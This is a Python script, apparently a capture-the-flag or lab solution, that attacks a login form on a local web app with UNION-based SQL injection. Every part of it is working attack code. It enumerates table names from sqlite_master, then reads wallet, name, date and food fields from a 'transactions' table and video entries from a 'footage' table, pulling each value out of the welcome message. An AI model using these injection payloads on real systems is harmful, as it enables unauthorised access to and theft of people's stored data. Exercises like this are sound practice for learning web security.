import requests
import os

URL = 'http://127.0.0.1:5000/'
wallet = "0x4eafca2a40bccebfb7ff90e6f36ea56e3ea53a6a52cad7d714fe4a9161409e83"

session = requests.Session()
with requests.Session() as s:
    tables = []
    for i in range(3):
        username = "' union select tbl_name, null, null FROM sqlite_master WHERE type='table' and tbl_name NOT like \
                        'sqlite_%' LIMIT 1 OFFSET {} -- "
        resp = s.post(URL+'/login', data={
            "username": username.format(i),
            "password": "test2"
        })

        content = resp.content.split(b"Welcome, ")[1].split(b'</div>')[0].decode().strip()
        tables.append(content)

    print("Tables: ")
    print('\t' + '\n\t'.join(tables))

    username = "' union select wallet, null, null FROM {} LIMIT 1 OFFSET {} -- ".format("transactions", 0)
    resp = s.post(URL + '/login', data={
        "username": username,
        "password": "test2"
    })
    wallet = resp.content.split(b"Welcome, ")[1].split(b'</div>')[0].decode().strip()

    username = "' union select name, null, null FROM {} LIMIT 1 OFFSET {} -- ".format("transactions", 0)
    resp = s.post(URL + '/login', data={
        "username": username,
        "password": "test2"
    })
    name = resp.content.split(b"Welcome, ")[1].split(b'</div>')[0].decode().strip()

    username = "' union select date, null, null FROM {} LIMIT 1 OFFSET {} -- ".format("transactions", 0)
    resp = s.post(URL + '/login', data={
        "username": username,
        "password": "test2"
    })
    date = resp.content.split(b"Welcome, ")[1].split(b'</div>')[0].decode().strip()

    username = "' union select food, null, null FROM {} LIMIT 1 OFFSET {} -- ".format("transactions", 0)
    resp = s.post(URL + '/login', data={
        "username": username,
        "password": "test2"
    })
    food = resp.content.split(b"Welcome, ")[1].split(b'</div>')[0].decode().strip()

    # ' union select wallet, null, null FROM transactions LIMIT 1 OFFSET 0 --
    print("\nTransactions table")
    print(wallet)
    print(name)
    print(date)
    print(food)

    print("\nFootages")
    for i in range(3):
        username = "' union select video, null, null FROM {} where date='2022-03-05' LIMIT 1 OFFSET {} -- ".format(
            "footage",
            i
        )
        resp = s.post(URL + '/login', data={
            "username": username,
            "password": "test2"
        })
        content = resp.content.split(b"Welcome, ")[1].split(b'</div>')[0].decode().strip()

        print(content)
